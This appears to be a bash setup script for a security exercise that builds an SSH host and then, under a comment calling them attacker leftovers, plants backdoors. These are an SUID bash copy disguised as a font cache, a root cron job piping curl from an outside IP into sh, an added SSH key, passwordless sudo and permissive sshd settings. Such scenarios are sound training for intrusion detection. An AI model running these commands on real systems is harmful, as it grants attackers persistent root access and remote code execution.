#!/bin/bash
set -e
rm -f /etc/ssh/sshd_config.d/*permitrootlogin*.conf
install -d -m 700 /etc/lt-ssh-test
for u in admin deploy; do
  id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
  [ -f /etc/lt-ssh-test/$u ] || ssh-keygen -q -t ed25519 -N '' -C "$u@helpdesk" -f /etc/lt-ssh-test/$u
  install -d -m 700 -o "$u" -g "$u" /home/$u/.ssh
  install -m 600 -o "$u" -g "$u" /etc/lt-ssh-test/$u.pub /home/$u/.ssh/authorized_keys
done
systemctl enable --now sshd
for i in $(seq 1 20); do ss -ltn | grep -q ':22 ' && break; sleep 0.5; done
cat > /usr/local/sbin/web-front <<'PYX'
#!/usr/bin/python3
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"web ok\n")
    def log_message(self, *a): pass
HTTPServer((os.environ.get("BIND", "127.0.0.1"), int(os.environ.get("PORT", "8097"))), H).serve_forever()
PYX
chmod 755 /usr/local/sbin/web-front
printf '[Unit]\nDescription=web-front\n\n[Service]\nExecStart=/usr/local/sbin/web-front\nRestart=always\nRestartSec=1\n\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/web-front.service
usermod -aG wheel admin
systemctl daemon-reload
systemctl enable --now web-front
find / -xdev -perm -4000 -type f 2>/dev/null | sort > /root/.lt-suid-baseline
crontab -u deploy - <<'X'
0 2 * * * /home/deploy/bin/cleanup.sh
X
# the attacker's leftovers
cp /usr/bin/bash /var/tmp/.font-cache && chmod 4755 /var/tmp/.font-cache
printf '*/5 * * * * root curl -s http://203.0.113.66/s | sh >/dev/null 2>&1\n' > /etc/cron.d/0anacron-update
printf '[Unit]\nDescription=System metrics collector\n\n[Service]\nExecStart=/bin/bash -c "while :; do sleep 60; done"\n\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sysmetrics.service
systemctl daemon-reload; systemctl enable --now sysmetrics
ssh-keygen -q -t ed25519 -N '' -C 'ops@203.0.113.66' -f /tmp/.k && install -d -m 700 -o deploy -g deploy /home/deploy/.ssh && cat /tmp/.k.pub >> /home/deploy/.ssh/authorized_keys && chown deploy: /home/deploy/.ssh/authorized_keys && rm -f /tmp/.k*
echo 'deploy ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-cloud-init-users && chmod 440 /etc/sudoers.d/90-cloud-init-users
printf 'PermitRootLogin yes\nPasswordAuthentication yes\n' > /etc/ssh/sshd_config.d/00-cloud.conf
systemctl restart sshd
